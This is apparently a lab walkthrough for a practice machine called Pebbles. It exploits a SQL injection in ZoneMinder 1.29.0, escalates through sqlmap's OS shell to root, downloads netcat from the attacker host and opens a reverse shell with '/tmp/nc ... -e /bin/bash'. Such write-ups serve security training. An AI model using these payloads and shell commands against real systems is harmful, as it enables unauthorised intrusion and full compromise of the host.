# Exploitation Guide for Pebbles

## Summary

This machine is exploited via an SQL injection vulnerability. A root  shell can be obtained due to the database being misconfigured to run  with root privileges.

## Enumeration

### Nmap

We start off by running an `nmap` scan against all TCP ports:

```
kali@kali:~$ sudo nmap -p- 192.168.120.138
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 09:27 EDT
Nmap scan report for 192.168.120.138
Host is up (0.032s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3305/tcp open  odette-ftp
8080/tcp open  http-proxy
```

### Dirb

The websites on ports 80 and 8080 hold nothing interesting. Navigating to http://192.168.120.138:3305/, we are presented with a default Apache web page. Let’s try to brute-force hidden directories of this website using `dirb` with the **/usr/share/wordlists/dirb/big.txt** wordlist:

```
kali@kali:~$ dirb http://192.168.120.138:3305 /usr/share/wordlists/dirb/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jun 19 11:32:12 2020
URL_BASE: http://192.168.120.138:3305/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://192.168.120.138:3305/ ----
+ http://192.168.120.138:3305/cgi-bin/ (CODE:403|SIZE:282)                                                                
==> DIRECTORY: http://192.168.120.138:3305/javascript/                                                                    
+ http://192.168.120.138:3305/server-status (CODE:403|SIZE:282)                                                           
==> DIRECTORY: http://192.168.120.138:3305/zm/                                                                            
                                                                                                                          
---- Entering directory: http://192.168.120.138:3305/javascript/ ----
^C> Testing: http://192.168.120.138:3305/javascript/error-pages                                                           
kali@kali:~$
```

This scan finds the directory */zm/*. Navigating there (http://192.168.120.138:3305/zm/), we see that this is a ZoneMinder CCTV monitoring software:

```
ZoneMinder Console - Running - default v1.29.0
```

This version of the software is vulnerable to [SQL injection](https://www.exploit-db.com/exploits/41239) in the POST variable `limit`.

## Exploitation

### SQL Injection Vulnerability

Let’s configure our web browser to use Burp proxy. We will visit the default page http://192.168.120.138:3305/zm/, click on **Add New Monitor**, and then click **Save**. We will capture the POST request in our proxy and then send it to the Repeater tab.

To validate the PoC, we will replace the body of the request with the following:

```
view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
```

Our request might look like this:

```
POST /zm/index.php HTTP/1.1
Host: 192.168.120.138:3305
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.120.138:3305/zm/?view=monitor
Content-Type: application/x-www-form-urlencoded
Content-Length: 1693
Connection: close
Cookie: zmSkin=classic; zmCSS=classic; ZMSESSID=sats1ojubp1fh24t0rg842aim0
Upgrade-Insecure-Requests: 1

view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
```

Sending the above request to the server indeed makes it wait for 5  seconds, confirming the vulnerability. This is easily exploitable with `sqlmap` or a similar tool.

### SQLMap

Let’s replace the body of the request with the following:

```
view=request&request=log&task=query&limit=100
```

We’ll send that request to the server to make sure we observe an  immediate 200 OK response. Next, we will right-click the request and  save it into a file **post.txt**.

The target system has been misconfigured to use a DBA user for the  application’s interactions with the MySQL database. Furthermore, the  database was misconfigured to run with root privileges. We can use `sqlmap` to automate the exploitation of this SQL injection vulnerability and obtain root privileges.

Although this might take a little while depending on our connection  (5-20 minutes), the result is a complete compromise of the operating  system.

```
kali@kali:~$ sqlmap -r post.txt --dbms mysql --os-shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.6#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

...

it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[13:35:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'

...

[13:35:19] [INFO] testing for SQL injection on POST parameter 'limit'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

...

[13:37:06] [INFO] checking if the injection point on POST parameter 'limit' is a false positive
POST parameter 'limit' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2030 HTTP(s) requests:
---
Parameter: limit (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#
---

...

[13:37:27] [INFO] testing if current user is DBA
[13:37:27] [INFO] fetching current user
[13:37:27] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[13:37:49] [INFO] adjusting time delay to 1 second due to good response times
root@localhost

what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
[13:40:02] [INFO] checking if UDF 'sys_exec' already exist
[13:40:02] [INFO] checking if UDF 'sys_eval' already exist
[13:40:02] [INFO] detecting back-end DBMS version from its banner
[13:40:02] [INFO] retrieved: 5.7.30
[13:41:39] [INFO] retrieving MySQL plugin directory absolute path
[13:41:39] [INFO] retrieved: /usr/lib/mysql/plugin/
[13:47:36] [INFO] retrieved: 8040
[13:48:09] [INFO] the local file '/tmp/sqlmap98eauib64777/lib_mysqludf_sys1h7_1m42.so' and the remote file '/usr/lib/mysql/plugin/libsyuoc.so' have the same size (8040 B)
[13:48:09] [INFO] creating UDF 'sys_exec' from the binary UDF file
[13:48:10] [INFO] creating UDF 'sys_eval' from the binary UDF file
[13:48:10] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[13:48:10] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[13:48:24] [INFO] retrieved: root
command standard output: 'root'
os-shell> 
```

### Reverse Shell

We can utilize this UDF created by `sqlmap` to obtain a  full reverse shell on the target. Let’s start a Netcat listener on port  3305. We will also start a python web server on port 80 and host our  copy of the Netcat binary:

```
kali@kali:~$ which nc
/usr/bin/nc
kali@kali:~$ cp /usr/bin/nc .
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We can now download the Netcat binary to the target machine and give it executable permissions:

```
os-shell> wget http://192.168.118.3/nc -O /tmp/nc
do you want to retrieve the command standard output? [Y/n/a] n
os-shell> chmod 777 /tmp/nc
do you want to retrieve the command standard output? [Y/n/a] n
os-shell>
```

Finally, we can use the binary to connect back to our attacking machine on port 3305:

```
os-shell> /tmp/nc 192.168.118.3 3305 -e /bin/bash
do you want to retrieve the command standard output? [Y/n/a] n
```

Looking back to our listener, we are presented with a root shell:

```
kali@kali:~$ nc -lvp 3305
listening on [any] 3305 ...
192.168.120.138: inverse host lookup failed: Unknown host
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.138] 49542
id
uid=0(root) gid=0(root) groups=0(root)
```